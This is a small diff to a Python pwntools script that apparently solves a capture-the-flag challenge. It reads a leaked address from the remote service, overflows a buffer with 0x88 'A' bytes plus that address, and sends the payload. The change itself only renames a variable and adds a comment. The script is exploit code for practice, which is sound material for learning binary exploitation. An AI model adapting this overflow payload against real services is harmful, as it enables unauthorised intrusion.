@@ -17,11 +17,11 @@ r = remote('ezpz.wpictf.xyz', 31337)
 
 msg = r.recvline()
 print(msg)
-flag_address = int(msg.split(' ')[1], 16)
+address = int(msg.split(' ')[1], 16)  # 16 for hex
 r.recvline()
 
 buf  = 'A'*0x88
-buf += p64(flag_address)
+buf += p64(address)
 r.sendline(buf)
 
 
